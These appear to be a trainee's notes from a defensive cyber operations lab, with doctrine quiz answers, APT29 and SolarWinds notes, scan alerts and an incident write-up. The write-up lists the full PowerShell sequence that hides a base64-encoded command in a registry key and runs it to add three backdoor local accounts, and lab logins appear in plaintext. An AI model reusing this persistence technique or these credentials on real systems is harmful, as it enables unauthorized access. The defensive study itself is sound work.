jump box
10.50.24.84
winsys4lanblu
defender 
1qaz2wsx!QAZ@WSX

endgame
172.64.0.123
blueuser64
1qaz2wsx!QAZ@WSX

https://wazuh.com/

https://securityonionsolutions.com/
172.64.0.100
defender@505cav.bde
1qaz2wsx!QAZ@WSX


powershell empire get requests
/login/process.php
/admin/get.php
/news/php  
  
signatures
useragent string:
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko 
serve value:
Microsoft-IIS/7.5
server banner:
<body>It Works!</h1>

JA3 - pre-baked into a lot of security applications like SecurityOnion
JA3 is a method to fingerprint SSL/TLS client connection based on fields in the Client Hello message from the SSL/TLS handshake. 
The following fields within the Client Hello message are used: SSL/TLS Version, Accepted Ciphers, List of Extensions, Elliptic Curves, and Elliptic Curve Formats. 
The result being a MD5 hash serving as the purpose for the fingerprint. Because the SSL/TLS handshake is sent in clear text we can use it to fingerprint any client application using the information within the Client Hello message.
New version: JEE

Windows Event Log
  To enable script block logging:
1. 	In the “Windows PowerShell” GPO settings, set “Turn on PowerShell Script Block Logging” to enabled.
Alternately, setting the following registry value will enable logging:
»  	HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging → EnableScriptBlockLogging = 1

purpose of deliberate defenseive cyberspace ops
defend dod
halt adversary offense
a. Purpose of DCO. The purpose of DCO is to halt adversary offensive initiative, sustain
or regain friendly initiative, and, if required, create conditions for a counteroffensive. It is not
solely defined by the specific effect created or the capabilities employed.

under the layers of cyber, given a country : physical layer

dco phase involves - little engagement, includes intel : screen

cpt operations process - step provde net diagram or range info : step 2 terrain identification

defensive prep of env - shape terrain or create situational awareness : adverse terrain

disrupt symbol : Integrates direct and indirect fires, terrain, and
obstacles to upset an enemy’s formation or
tempo, interrupt the enemy’s timetable, or cause
enemy forces to commit prematurely or attack in a
piecemeal fashion.

objective used by commander purpose slow or halt attack : c. Gain Time. Commanders may employ defensive measures to gain time. Such measures
succeed by slowing or halting an attack while allowing friendly forces time to reinforce the
defense. 

# of personnel cpt consist of : 39

HMM human maturity model process involves levels - new data analysis : level 3 innovative

tool build individual plays self-contained detect intrusions : security onion playbook

apt-29 - boommic performs defferent methods - 4 methods to persistance : beacon, windows run key, tasks, certs

q44 battlespace awareness and analysis 10.13.38.11 : a. DMZ-Other Network


scenario notes
Defensive Cyberspace Operations (DCO) ISO JTF-387 for the FOB Acorn ENT_LAN critical mission network IOT
APT29 - https://attack.mitre.org/groups/G0016/
Cozy Bear - https://www.crowdstrike.com/Responder sent a SYN ACK followed by a FIN, we never saw a SYN from the originatorblog/observations-from-the-stellarparticle-campaign/ ssh to public facing server1, rdp with service account to internal server1, rdo with domain admin to internal server2, login to O365 portal with privelege cloud account
The Dukes
Carbanak - application layer protocol, web protocol, boot or logon autostart, registry run keys/startup folder, create local account, email collection, 
UNC2452 - campaign, SolarWinds.Orion.Core.BusinessLayer.dll communicates via HTTP to third party servers, loaded into SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe, attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will return a CNAME record that points to a Command and Control (C2) domai,  
NOBELIUM
StellarParticle
Dark Halo


192.168.99.20:53 --> SYN ACK FIN, no SYN from originator --> 10.50.255.254:45097




2023-08-23 11:08:53.732 -07:00 
"T1043"
Did not receive identification string from 192.168.99.20 port 58458\",
\"predecoder\":{\"program_name\":\"sshd\",\"timestamp\":\"Aug 23 18:08:44\",
\"hostname\":\"so505cav\"},
\"decoder\":{\"parent\":\"sshd\",\"name\":\"sshd\"},
\"data\":{\"srcip\":\"192.168.99.20\",
\"srcport\":\"58458\"},
\"location\":\"/var/log/secure\"}"

2023-08-23 11:09:47.738 -07:00
Unable to negotiate with 192.168.99.20 port 50958: no matching MAC found. Their offer: hmac-md5,hmac-sha1,hmac-ripemd160 [preauth]\",
\"predecoder\":{\"program_name\":\"sshd\",
\"timestamp\":\"Aug 23 18:09:42\",
\"hostname\":\"so505cav\"},
\"decoder\":{\"name\":\"sshd\"},
\"location\":\"/var/log/secure\"}"
"Aug 23 18:09:42 so505cav sshd[19431]: Unable to negotiate with 192.168.99.20 port 50958: no matching MAC found. Their offer: hmac-md5,hmac-sha1,hmac-ripemd160 [preauth]"

2023-08-23 11:34:13.203 -07:00
"connection.state_description": [
      "Connection attempt seen, no reply"
"source.ip": [
      "10.13.38.11"
"source.port.keyword": [
      "34770"
"destination.ip.keyword": [
      "192.168.1.254"
"destination.port": [
      1723

Timestamp                        Rule                                                         Level    Source            Destination
2023-08-23 11:34:13.203 -07:00	ET SCAN Rapid POP3S Connections - Possible Brute Force Attack	low	    10.13.38.11	34770	192.168.1.13	995
2023-08-23 11:08:53.732 -07:00	sshd: insecure connection attempt (scan).	                    low	    192.168.99.20		
2023-08-23 11:34:13.194 -07:00	ET SCAN Rapid POP3 Connections - Possible Brute Force Attack	low	    10.13.38.11	34770	192.168.1.5	110
2023-08-23 11:34:13.204 -07:00	ET SCAN Rapid IMAPS Connections - Possible Brute Force Attack	low	    10.13.38.11	34770	192.168.1.16	993
2023-08-23 11:34:13.205 -07:00	ET SCAN Rapid IMAP Connections - Possible Brute Force Attack	low	    10.13.38.11	34770	192.168.1.12	143	
2023-08-23 10:49:46.420 -07:00	ET DNS Query for .cc TLD	                                    medium	192.168.99.25	61205	192.168.1.250	53
2023-08-23 11:34:13.191 -07:00	ET SCAN Potential VNC Scan 5900-5920	                        medium	10.13.38.11	34770	192.168.1.8	5900
2023-08-23 11:08:37.946 -07:00	ET SCAN Potential VNC Scan 5900-5920	                        medium	192.168.99.20	33852	172.64.0.11	5900
2023-08-23 11:34:13.527 -07:00	ET SCAN Potential VNC Scan 5800-5820	                        medium	10.13.38.11	34770	192.168.1.4	5811
2023-08-23 11:08:38.026 -07:00	ET SCAN Potential VNC Scan 5800-5820	                        medium	192.168.99.20	50368	172.64.0.11	5800
2023-08-23 11:34:13.190 -07:00	ET SCAN Potential SSH Scan	                                  medium	10.13.38.11	34770	192.168.1.9	22
2023-08-23 11:08:37.946 -07:00	ET SCAN Potential SSH Scan	                                  medium	192.168.99.20	32924	172.64.0.13	22
2023-08-23 11:34:13.192 -07:00	ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Outbound)	low	10.13.38.11	34770	192.168.1.10	3389
2023-08-23 11:09:01.157 -07:00	ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Outbound)	low	192.168.99.20	55182	172.64.0.200	3389
2023-08-23 11:34:13.192 -07:00	ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Inbound)	low	10.13.38.11	34770	192.168.1.10	3389
2023-08-23 11:09:01.157 -07:00	ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Inbound)	low	192.168.99.20	55182	172.64.0.200	3389
2023-08-23 11:34:20.326 -07:00	ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection	low	10.13.38.11	53420	192.168.1.6	445
2023-08-23 11:08:50.156 -07:00	ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection	low	192.168.99.20	60912	172.64.0.11	445
2023-08-23 11:10:06.281 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.123	443	192.168.99.20	49356
2023-08-23 11:10:06.128 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.123	443	192.168.99.20	49338	
2023-08-23 11:10:06.128 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.123	443	192.168.99.20	49324
2023-08-23 11:08:56.153 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.184	443	192.168.99.20	55872
2023-08-23 11:08:50.178 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.123	443	192.168.99.20	60228
2023-08-23 11:08:50.162 -07:00	ET INFO TLS Handshake Failure	medium	172.64.0.100	443	192.168.99.20	49500	
2023-08-23 11:12:54.412 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	34612	172.64.0.12	445
2023-08-23 11:12:40.320 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	53960	172.64.0.10	445
2023-08-23 11:12:34.307 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	53992	172.64.0.13	445
2023-08-23 11:08:50.173 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	32832	172.64.0.11	445
2023-08-23 11:08:50.172 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	34612	172.64.0.12	445
2023-08-23 11:08:50.171 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	53992	172.64.0.13	445
2023-08-23 11:08:50.171 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	53992	172.64.0.13	445


Administrator
W!nd0w5P@zz!!


‎Thursday, ‎August ‎24, ‎2023, ‏‎4:52:58 AM

New-Item -Path "HKLM:\System\Setup\" -Name "LotR"
$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char youshallpass }'

‎Thursday, ‎August ‎24, ‎2023, ‏‎4:52:58 AM
User with credentials for Administrator, logged into 192.168.1.7 and ran PowerShell commands to create three users with a common password. Currently, these users have yet to log into this machine. 

Users Created:
lurtz               S-1-5-21-2183018456-3128199268-2372014868-
mithrandir          S-1-5-21-2183018456-3128199268-2372014868-1010
saruman             S-1-5-21-2183018456-3128199268-2372014868-1011

Password for Users:
YouShallPass!!!1234

Registry Key location:
HKLM:\System\Setup\LotR

.ps1 file location:
C:\Users\Administrator\towar.ps1

PowerShell commands:
New-Item -Path "HKLM:\System\Setup\" -Name "LotR"
$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char youshallpass }'
$string
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($String))
$encoded
New-ItemProperty -Path "HKCU:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
New-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
Get-ExecutionPolicy
gci -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
gci -Path "HKLM:\System\Setup\LotR"
Get-ItemProperty -Path "HKLM:\System\Setup\LotR"
Get-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
Write-Host '$cmd = Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"; powershell.exe -EncodedCommand $cmd' > towar.ps1
powershell.exe towar.ps1
powershell.exe .\towar.ps1
net user
$cmd
$cmd = Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
$cmd
powershell.exe -EncodedCommand $cmd
$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char YouShallPass!!!1234 }'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($String))
New-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
$encoded
powershell.exe -EncodedCommand $encoded
$encoded
exit


MsMpEng.exe
mpengine_etw.dll

